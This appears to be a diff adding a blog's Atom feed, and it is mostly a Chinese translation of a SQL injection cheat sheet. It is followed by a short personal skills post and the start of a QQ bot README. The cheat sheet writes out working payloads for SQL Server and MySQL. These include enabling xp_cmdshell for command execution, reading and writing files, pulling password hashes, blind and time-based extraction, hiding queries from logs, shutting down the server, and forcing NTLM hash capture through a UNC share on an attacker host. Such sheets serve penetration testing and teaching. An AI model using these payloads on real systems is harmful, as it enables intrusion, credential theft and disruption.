+<h4 id="toc_31">获取字段类型</h4>
+
+<ul>
+<li><p><code>&#39; union select sum(columntofind) from users--</code> (S) </p>
+
+<pre><code>Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39; 
+[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 
+</code></pre>
+
+<p>如果没有返回错误说明字段是<strong>数字类型</strong></p></li>
+<li><p>同样的，你可以使用<code>CAST()</code>和<code>CONVERT()</code></p>
+
+<ul>
+<li>  <code>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--</code></li>
+</ul></li>
+<li><p><code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code></p>
+
+<p>没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。</p></li>
+<li><p><code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code></p>
+
+<p>没报错 – 第一个字段是<code>integer</code>类型。</p></li>
+<li><p><code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --</code></p>
+
+<p>报错 – 第二个字段不是<code>integer</code>类型</p></li>
+<li><p><code>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</code></p>
+
+<p>没报错 – 第二个字段是<code>string</code>类型。</p></li>
+<li><p><code>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</code></p>
+
+<p>报错 – 第三个字段不是<code>integer</code> </p></li>
+<li><p>……</p>
+
+<pre><code>Microsoft OLE DB Provider for SQL Server error &#39;80040e07&#39; 
+Explicit conversion from data type int to image is not allowed.
+</code></pre></li>
+</ul>
+
+<p><strong>你在遇到union错误之前会先遇到convert()错误</strong>，所以先使用convert()再用union</p>
+
+<h3 id="toc_32">简单的注入(MSO+)</h3>
+
+<p><code>&#39;; insert into users values( 1, &#39;hax0r&#39;, &#39;coolpass&#39;, 9 )/*</code></p>
+
+<h3 id="toc_33">有用的函数、信息收集、内置程序、大量注入笔记</h3>
+
+<h4 id="toc_34"><code>@@version</code>(MS)</h4>
+
+<p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</p>
+
+<p><code>INSERT INTO members(id, user, pass) VALUES(1, &#39;&#39;+SUBSTRING(@@version,1,10) ,10)</code></p>
+
+<h4 id="toc_35">文件插入(Bulk Insert)(S)</h4>
+
+<p>把文件内容插入到表中。如果你不知道应用目录你可以去<strong>读取IIS metabase file</strong>(<em>仅IIS 6</em>)(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>)然后在里面找到应用目录。</p>
+
+<ol>
+<li>新建一个表foo(<code>line varchar(8000)</code>)</li>
+<li><code>BULK INSERT foo FROM &#39;c:\inetpub\wwwroot\login.asp&#39;</code></li>
+<li>DROP了临时表，重复另一个文件</li>
+</ol>
+
+<h4 id="toc_36">BCP(S)</h4>
+
+<p>写入文件。这个功能需要登录<br/>
+<code>bcp &quot;SELECT * FROM test..foo&quot; queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</code></p>
+
+<h4 id="toc_37">SQL Server的VBS/WSH(S)</h4>
+
+<p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSH</p>
+
+<pre><code>declare @o int 
+exec sp_oacreate &#39;wscript.shell&#39;, @o out 
+exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39;
+</code></pre>
+
+<blockquote>
+<p>Username: <code>&#39;; declare @o int exec sp_oacreate &#39;wscript.shell&#39;, @o out exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39; --</code></p>
+</blockquote>
+
+<h4 id="toc_38">执行系统命令，xp_cmdshell(S)</h4>
+
+<p>众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限</p>
+
+<p><code>EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;</code></p>
+
+<p>用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。</p>
+
+<p><code>EXEC master.dbo.xp_cmdshell &#39;ping &#39;</code></p>
+
+<p>如果有错误，或者union或者其他的什么，你都不能直接读到结果。</p>
+
+<h4 id="toc_39">SQL Server中的一些特殊的表(S)</h4>
+
+<ul>
+<li><p>Error Messages</p>
+
+<p><code>master..sysmessages</code></p></li>
+<li><p>Linked Servers </p>
+
+<p><code>master..sysservers</code></p></li>
+<li><p>Password (2000和2005版本的都能被破解，这俩的加密算法很相似) </p>
+
+<p>SQL Server 2000: masters..sysxlogins </p>
+
+<p>SQL Server 2005 : sys.sql_logins </p></li>
+</ul>
+
+<h4 id="toc_40">SQL Server的其它内置程序(S)</h4>
+
+<ol>
+<li><p>命令执行 (xp_cmdshell) </p>
+
+<p><code>exec master..xp_cmdshell &#39;dir&#39;</code></p></li>
+<li><p>注册表操作 (xp_regread)</p>
+
+<ol>
+<li>xp_regaddmultistring</li>
+<li>xp_regdeletekey</li>
+<li>xp_regdeletevalue</li>
+<li>xp_regenumkeys</li>
+<li>xp_regenumvalues</li>
+<li>xp_regread</li>
+<li>xp_regremovemultistring</li>
+<li><p>xp_regwrite </p>
+
+<pre><code>exec xp_regread HKEY_LOCAL_MACHINE, &#39;SYSTEM\CurrentControlSet       \Services\lanmanserver\parameters&#39;, &#39;nullsessionshares&#39; 
+exec xp_regenumvalues HKEY_LOCAL_MACHINE, &#39;SYSTEM       \CurrentControlSet  \Services\snmp\parameters\validcommunities&#39;
+</code></pre></li>
+</ol></li>
+<li><p>管理服务(xp_servicecontrol)</p></li>
+<li><p>媒体(xp_availablemedia)</p></li>
+<li><p>ODBC 资源 (xp_enumdsn)</p></li>
+<li><p>登录 (xp_loginconfig)</p></li>
+<li><p>创建Cab文件 (xp_makecab)</p></li>
+<li><p>域名列举 (xp_ntsec_enumdomains)</p></li>
+<li><p>杀进程 (need PID) (xp_terminate_process)</p></li>
+<li><p>新建进程 (<em>实际上你想干嘛都行</em>) </p>
+
+<pre><code>sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ 
+exec xp_webserver
+</code></pre></li>
+<li><p>写文件进UNC或者内部路径 (sp_makewebtask)</p></li>
+</ol>
+
+<h4 id="toc_41">大量MSSQL笔记</h4>
+
+<p><code>SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/</code></p>
+
+<p><code>DECLARE @result int; EXEC @result = xp_cmdshell &#39;dir *.exe&#39;;IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p>
+
+<p>HOST_NAME() <br/>
+IS_MEMBER (Transact-SQL)<br/><br/>
+IS_SRVROLEMEMBER (Transact-SQL)<br/><br/>
+OPENDATASOURCE (Transact-SQL)</p>
+
+<p><code>INSERT tbl EXEC master..xp_cmdshell OSQL /Q&quot;DBCC SHOWCONTIG&quot;</code></p>
+
+<p>OPENROWSET (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p>
+
+<p>你不能在 SQL Server 的Insert查询里使用子查询(sub select).</p>
+
+<h4 id="toc_42">使用LIMIT(M)或ORDER(MSO)的注入</h4>
+
+<p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,&#39;x&#39;/*,10 ;</code></p>
+
+<p>如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。</p>
+
+<h4 id="toc_43">关掉SQL Server(S)</h4>
+
+<p>如果你真的急了眼，<code>&#39;;shutdown --</code></p>
+
+<h3 id="toc_44">在SQL Server 2005中启用xp_cmdshell</h3>
+
+<p>默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。</p>
+
+<pre><code>EXEC sp_configure &#39;show advanced options&#39;,1 
+RECONFIGURE
+
+EXEC sp_configure &#39;xp_cmdshell&#39;,1 
+RECONFIGURE
+</code></pre>
+
+<h3 id="toc_45">探测SQL Server数据库的结构(S)</h3>
+
+<h4 id="toc_46">获取用户定义表</h4>
+
+<p><code>SELECT name FROM sysobjects WHERE xtype = &#39;U&#39;</code></p>
+
+<h4 id="toc_47">获取字段名</h4>
+
+<p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &#39;tablenameforcolumnnames&#39;)</code></p>
+
+<h3 id="toc_48">移动记录(Moving records)(S)</h3>
+
+<ul>
+<li><p>修改WHERE，使用<strong>NOT IN</strong>或者<strong>NOT EXIST</strong><br/>
+<code>... WHERE users NOT IN (&#39;First User&#39;, &#39;Second User&#39;)</code><br/>
+<code>SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code> &ndash; 这个好用</p></li>
+<li><p>脏的不行的小技巧</p>
+
+<p><code>SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int</code></p>
+
+<p><code>Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype=&#39;U&#39; and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = &#39;U&#39;) as p where p.x=21</code></p></li>
+</ul>
+
+<h3 id="toc_49">快速的脱掉基于错误(Error Based)的SQL Server注入(S)</h3>
+
+<p><code>&#39;;BEGIN DECLARE @rt varchar(8000) SET @rd=&#39;:&#39; SELECT @rd=@rd+&#39; &#39;+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &#39;MEMBERS&#39;) AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</code></p>
+
+<p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Fast way to extract data from Error Based SQL Injections</a></strong></p>
+
+<h3 id="toc_50">盲注</h3>
+
+<h4 id="toc_51">关于盲注</h4>
+
+<p>一个经过完整而优秀开发的应用一般来说你是<strong>看不到错误提示的</strong>，所以你是没办法从Union攻击和错误中提取出数据的</p>
+
+<p><strong>一般盲注</strong>，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果</p>
+
+<p><strong>完全盲注</strong>，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。</p>
+
+<p>在一般盲注下你能够使用<strong>If语句</strong>或者<strong>WHERE查询注入</strong><em>(一般来说比较简单)</em>，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用<strong>WAIT FOR DELAY &lsquo;0:0:10&rsquo;</strong>，在MySQL中使用<strong>BENCHMARK()</strong>，在PostgreSQL中使用<strong>pg_sleep(10)</strong>，以及在ORACLE中的一些<strong>PL/SQL小技巧</strong>。</p>
+
+<h4 id="toc_52">实战中的盲注实例</h4>
+
+<p>以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。</p>
+
+<p><strong>TRUE</strong>和<strong>FALSE</strong>标志代表了查询返回了true或false</p>
+
+<pre><code>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78-- 
+
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;103-- 
+
+TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;89-- 
+
+TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;83-- 
+
+TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;80-- 
+
+FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
+</code></pre>
+
+<p>由于上面<strong>后两个查询都是false</strong>，我们能清楚的知道表名的第一个<strong>字符的ASCII码是80，也就是&quot;P&rdquo;</strong>。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。</p>
+
+<h3 id="toc_53">延时盲注</h3>
+
+<p>首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。</p>
+
+<h4 id="toc_54"><code>WAITFOR DELAY [time]</code>(S)</h4>
+
+<p>这就跟<code>sleep</code>差不多，等待特定的时间。通过CPU来让数据库进行等待。</p>
+
+<p><code>WAITFOR DELAY &#39;0:0:10&#39;--</code></p>
+
+<p>你也可以这样用</p>
+
+<p><code>WAITFOR DELAY &#39;0:0:0.51&#39;</code></p>
+
+<h4 id="toc_55">实例</h4>
+
+<ul>
+<li>俺是sa吗？
+<code>if (select user) = &#39;sa&#39; waitfor delay &#39;0:0:10&#39;</code></li>
+<li>ProductID =<code>1;waitfor delay &#39;0:0:10&#39;--</code></li>
+<li>ProductID =<code>1);waitfor delay &#39;0:0:10&#39;--</code></li>
+<li>ProductID =<code>1&#39;;waitfor delay &#39;0:0:10&#39;--</code></li>
+<li>ProductID =<code>1&#39;);waitfor delay &#39;0:0:10&#39;--</code></li>
+<li>ProductID =<code>1));waitfor delay &#39;0:0:10&#39;--</code></li>
+<li>ProductID =<code>1&#39;));waitfor delay &#39;0:0:10&#39;--</code></li>
+</ul>
+
+<h4 id="toc_56"><code>BENCHMARK()</code>(M)</h4>
+
+<p>一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。<br/>
+<code>BENCHMARK(howmanytimes, do this)</code></p>
+
+<h4 id="toc_57">实例</h4>
+
+<ul>
+<li><p>俺是root吗？爽！<br/>
+<code>IF EXISTS (SELECT * FROM users WHERE username = &#39;root&#39;) BENCHMARK(1000000000,MD5(1))</code></p></li>
+<li><p>判断表是否存在<br/>
+<code>IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))</code></p></li>
+</ul>
+
+<h4 id="toc_58"><code>pg_sleep(seconds)</code>(P)</h4>
+
+<p>睡眠指定秒数。</p>
+
+<ul>
+<li><code>SELECT pg_sleep(10);</code>睡个十秒</li>
+</ul>
+
+<h3 id="toc_59">掩盖痕迹</h3>
+
+<h4 id="toc_60"><code>-sp_password log bypass</code>(S)</h4>
+
+<p>出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。</p>
+
+<h3 id="toc_61">注入测试</h3>
+
+<p>这些测试既简单又清晰，适用于盲注和悄悄地搞。</p>
+
+<ol>
+<li><p><code>product.asp?id=4 (SMO)</code></p>
+
+<ol>
+<li><code>product.asp?id=5-1</code></li>
+<li><code>product.asp?id=4 OR 1=1</code></li>
+</ol></li>
+<li><p><code>product.asp?name=Book</code></p>
+
+<ol>
+<li><code>product.asp?name=Bo’%2b’ok</code></li>
+<li><code>product.asp?name=Bo’ || ’ok (OM)</code></li>
+<li><code>product.asp?name=Book’ OR ‘x’=’x</code></li>
+</ol></li>
+</ol>
+
+<h3 id="toc_62">一些其他的MySQL笔记</h3>
+
+<ul>
+<li>子查询只能在MySQL4.1+使用</li>
+<li>用户
+
+<ul>
+<li><code>SELECT User,Password FROM mysql.user;</code></li>
+</ul></li>
+<li><code>SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)=&#39;2&#39;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;</code></li>
+<li><code>SELECT ... INTO DUMPFILE</code>
+
+<ul>
+<li>把查询写入一个<strong>新文件</strong>中(不能修改已有文件)</li>
+</ul></li>
+<li>UDF功能
+
+<ul>
+<li><code>create function LockWorkStation returns integer soname &#39;user32&#39;;</code></li>
+<li><code>select LockWorkStation();</code></li>
+<li><code>create function ExitProcess returns integer soname &#39;kernel32&#39;;</code></li>
+<li><code>select exitprocess();</code></li>
+</ul></li>
+<li><code>SELECT USER();</code></li>
+<li><code>SELECT password,USER() FROM mysql.user;</code></li>
+<li>admin密码哈希的第一位
+
+<ul>
+<li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code></li>
+</ul></li>
+<li>文件读取
+
+<ul>
+<li><code>query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li>
+</ul></li>
+<li><p>MySQL读取文件内容</p>
+
+<ul>
+<li><p><strong>默认这个功能是没开启的！</strong></p>
+
+<pre><code>create table foo( line blob ); 
+load data infile &#39;c:/boot.ini&#39; into table foo; 
+select * from foo;
+</code></pre></li>
+</ul></li>
+<li><p>MySQL里的各种延时</p></li>
+<li><p><code>select benchmark( 500000, sha1( &#39;test&#39; ) );<br/>
+query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></p></li>
+<li><p><code>select if( user() like &#39;root@%&#39;, benchmark(100000,sha1(&#39;test&#39;)), &#39;false&#39; );</code></p></li>
+<li><p><strong>遍历数据，暴力猜解</strong></p>
+
+<ul>
+<li><code>select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1,benchmark(100000,sha1(&#39;test&#39;)), &#39;false&#39; );</code></li>
+</ul></li>
+</ul>
+
+<h4 id="toc_63">MySQL中好用的函数</h4>
+
+<ul>
+<li><p><code>MD5()</code></p>
+
+<p>MD5哈希</p></li>
+<li><p><code>SHA1()</code> </p>
+
+<p>SHA1哈希</p></li>
+<li><p><code>PASSWORD()</code></p></li>
+<li><p><code>ENCODE()</code></p></li>
+<li><p><code>COMPRESS()</code> </p>
+
+<p>压缩数据，在盲注时读取大量数据很好用</p></li>
+<li><p><code>ROW_COUNT()</code></p></li>
+<li><p><code>SCHEMA()</code></p></li>
+<li><p><code>VERSION()</code></p>
+
+<p>跟<code>@@version</code>是一样的</p></li>
+</ul>
+
+<h3 id="toc_64">SQL注入的高级使用</h3>
+
+<p>一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）</p>
+
+<blockquote>
+<p>Name:<code>&#39; + (SELECT TOP 1 password FROM users ) + &#39;</code></p>
+
+<p>Email : <code>xx@xx.com</code></p>
+</blockquote>
+
+<p>如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。</p>
+
+<h4 id="toc_65">强制SQL Server来得到NTLM哈希</h4>
+
+<p>这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain &amp; Abel)捕捉NTLM session。</p>
+
+<h4 id="toc_66">Bulk insert UNC共享文件 (S)</h4>
+
+<p><code>bulk insert foo from &#39;\\YOURIPADDRESS\C$\x.txt&#39;</code></p>
+
+<h2 id="toc_67">参考资料</h2>
+
+<p>因为以下笔记是这几年从各种不同来源手机的，还有一些是个人经验，所以我可能漏掉了一些参考项。如果你肯定我漏了你的或者其他人的资料请<a href="http://ferruh.mavituna.com/iletisim/">给我发邮件</a><em>(ferruh-at-mavituna.com)</em>，我会尽快更新。</p>
+
+<ul>
+<li><strong>各种资料</strong>
+
+<ul>
+<li><a href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em></li>
+<li><a href="http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf">More Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em></li>
+<li><a href="http://www.imperva.com/download.asp?id=4">Blindfolded SQL Injection, Ofer Maor</a> – <em>Amichai Shulman</em></li>
+<li><a href="http://www.ngssoftware.com/papers/HackproofingMySQL.pdf">Hackproofing MySQL</a>, <em>Chris Anley</em></li>
+<li><a href="http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html">Database Hacker&rsquo;s Handbook, David Litchfield</a>, <em>Chris Anley, John Heasman, Bill Grindlay</em></li>
+<li><strong>楼上的团队</strong>！</li>
+</ul></li>
+<li><strong>MSSQL相关</strong>
+
+<ul>
+<li>MSSQL Operators - <a href="http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx</a></li>
+<li>Transact-SQL Reference - <a href="http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx</a></li>
+<li>String Functions (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms181984.aspx">http://msdn2.microsoft.com/en-us/library/ms181984.aspx</a></li>
+<li>List of MSSQL Server Collation Names - <a href="http://msdn2.microsoft.com/en-us/library/ms180175.aspx">http://msdn2.microsoft.com/en-us/library/ms180175.aspx</a></li>
+<li>MSSQL Server 2005 Login Information and some other functions : <a href="http://www.notsosecure.com/">Sumit Siddharth</a></li>
+</ul></li>
+<li><strong>MySQL相关</strong>
+
+<ul>
+<li>Comments : <a href="http://dev.mysql.com/doc/">http://dev.mysql.com/doc/</a></li>
+<li>Control Flows - <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html">http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html</a></li>
+<li>MySQL Gotchas - <a href="http://sql-info.de/mysql/gotchas.htm">http://sql-info.de/mysql/gotchas.htm</a></li>
+<li><a href="http://www.securiteam.com/securityreviews/5KP0N1PC1W.html">New SQL Injection Concept</a>, <em>Tonu Samuel</em></li>
+</ul></li>
+</ul>
+
+<h2 id="toc_68">更新日志</h2>
+
+<ul>
+<li>15/03/2007 - Public Release v1.0</li>
+<li>16/03/2007 - v1.1
+
+<ul>
+<li>Links added for some paper and book references</li>
+<li>Collation sample added</li>
+<li>Some typos fixed</li>
+<li>Styles and Formatting improved</li>
+<li>New MySQL version and comment samples</li>
+<li>PostgreSQL Added to Ascii and legends, pg_sleep() added blind section</li>
+<li>Blind SQL Injection section and improvements, new samples</li>
+<li>Reference paper added for MySQL comments</li>
+</ul></li>
+<li>21/03/2007 - v1.2
+
+<ul>
+<li>BENCHMARK() sample changed to avoid people DoS their MySQL Servers</li>
+<li>More Formatting and Typo</li>
+<li>Descriptions for some MySQL Function</li>
+</ul></li>
+<li>30/03/2007 v1.3
+
+<ul>
+<li>Niko pointed out PotsgreSQL and PHP supports stacked queries</li>
+<li>Bypassing second MD5 check login screens description and attack added</li>
+<li>Mark came with extracting NTLM session idea, added</li>
+<li>Detailed Blind SQL Exploitation added</li>
+</ul></li>
+<li>13/04/2007 v1.4 - Release
+
+<ul>
+<li>SQL Server 2005 enabling xp_cmdshell added (trick learned from mark)</li>
+<li><a href="http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html">日文版SQL注入速查表发布</a> (<em>v1.1</em>)</li>
+</ul></li>
+</ul>
+
+<h3 id="toc_69">待办事项 / 联系方式 / 帮助</h3>
+
+<p>我有一大堆ORACLE、PostgreSQL、DB2和MS Access的笔记，还有一些其他还没整理的小技巧. 我想应该很快就能整理好了。如果你想加入进来或者提供一些技巧，<a href="http://ferruh.mavituna.com/iletisim/">给我发邮件吧</a><em>(ferruh-at-mavituna.com)</em></p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[个人总结]]></title>
+    <link href="http://yinzo.github.io/14608289034158.html"/>
+    <updated>2016-04-17T01:48:23+08:00</updated>
+    <id>http://yinzo.github.io/14608289034158.html</id>
+    <content type="html"><![CDATA[
+<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffgw1euglbmesppj217w0kkqbc.jpg" alt="技能树——2015.07.26"/>只有把自己的技能都列出来的时候才能发现自己是有多么的弱。希望以后能有一份拿得出手的技能树，就放在这张旧的旁边。</p>
+
+<p>记录一下技能树里面的具体内容：</p>
+
+<h2 id="toc_0">小学</h2>
+
+<ul>
+<li>瞎玩Flash</li>
+</ul>
+
+<h2 id="toc_1">初中</h2>
+
+<ul>
+<li>VB自学，初二——高一
+
+<ul>
+<li>当时在玩无损，写了个cue文件批量修改与格式化的小软件</li>
+</ul></li>
+</ul>
+
+<h2 id="toc_2">高中</h2>
+
+<ul>
+<li>C#自学，高二——高三
+
+<ul>
+<li>高三用C#做出一个舒尔特表格的3×3与5×5版本</li>
+</ul></li>
+<li>入门Ubuntu</li>
+</ul>
+
+<span id="more"></span><!-- more -->
+
+<h2 id="toc_3">高中毕业至大学入学的暑假</h2>
+
+<ul>
+<li>自学HTML/CSS/PHP/JavaScript/MySQL</li>
+<li>转到Mac平台</li>
+<li>建立第一个WordPress博客，自行修改主题。</li>
+<li>写出第一个基于JavaScript的小东西：Spin!</li>
+<li>一个星期自学JQuery并完成舒尔特表格JS版</li>
+<li>入门Python，写出第一个POC，遍历14级新生信息</li>
+<li>自学计算机网络</li>
+</ul>
+
+<h2 id="toc_4">大一</h2>
+
+<ul>
+<li>课程学习C++，高分过</li>
+<li>水了几次CTF，入门了XSS、了解了CSRF、用工具日了几个SQL注入，成功shell</li>
+<li>入手Linode1024</li>
+<li>使用Django+MySQL完整搭出个人博客</li>
+<li>完成学生信息查询系统</li>
+<li>为了更便捷的科学上网以及充分利用VPS，搭建Shadowsocks</li>
+<li>完成编写SmartQQ-Bot初版</li>
+<li>参加（水）华为杯大学生智能大赛，入门机器学习</li>
+<li>完成SmartQQ-Bot失物招领版本</li>
+<li>C++课程设计，独立使用MySQL+Qt完成数据库+界面，高分过</li>
+<li>基本完成SmartQQ-Bot框架的开发</li>
+<li>学习《啊哈！算法》</li>
+</ul>
+
+<p>现在我在用的好多技能，都还是高三毕业那个两个月的暑假学出来的，当时我的效率简直吓哭，比高三那时候疯的多了，一个星期自学完计算机网络什么的现在简直不敢想，3个小时就坐不住了。</p>
+
+<p>之前放假之前说好的完成TODO_list，现在也就搞了搞SmartQQBot框架跟深入Python，效率不堪直视。嗯现在归纳个人技能表也算做好了:D。</p>
+
+<p>之后几天内差不多该回学校了，一堆一堆的书都等着我呢;P</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[基于SmartQQ的Python QQ机器人框架]]></title>
+    <link href="http://yinzo.github.io/14608289253115.html"/>
+    <updated>2016-04-17T01:48:45+08:00</updated>
+    <id>http://yinzo.github.io/14608289253115.html</id>
+    <content type="html"><![CDATA[
+<p>项目地址：<a href="https://github.com/Yinzo/SmartQQBot">https://github.com/Yinzo/SmartQQBot</a></p>
+
+<p>这是一个原本是自己在看到某一个QQ群中的机器人后，以娱乐的心态写的一个QQ机器人。登陆部分逻辑与代码参考了<a href="https://github.com/xqin/SmartQQ-for-Raspberry-Pi">原名：SmartQQ-for-Raspberry-Pi(PiWebQQV2)</a>这一项目，结合自己的需求写出来的一个以娱乐为主的小玩具。</p>
+
+<p>习惯性地把自己写的小东西发布到Github，意外地发现受到了一定的支持。加上在进一步开发失物招领功能的时候发现代码逻辑有点混乱，于是决定进行一次完全的重构，希望能够开发出一个便于二次开发的QQ机器人框架。</p>
+
+<p>以下为没有重构之前的机器人的README，但是近期（两到三个星期）机器人就将重构，所以以下内容可能会马上过时。</p>
+
+<span id="more"></span><!-- more -->
+
+<hr/>
+
+<h2 id="toc_0">如何使用</h2>
+
+<ul>
+<li><code>python QQBot.py</code></li>
+<li>等待提示“登陆二维码下载成功，请扫描”，打开脚本所在目录的v.jpg图片扫描二维码。</li>
+<li>等待登陆成功的提示
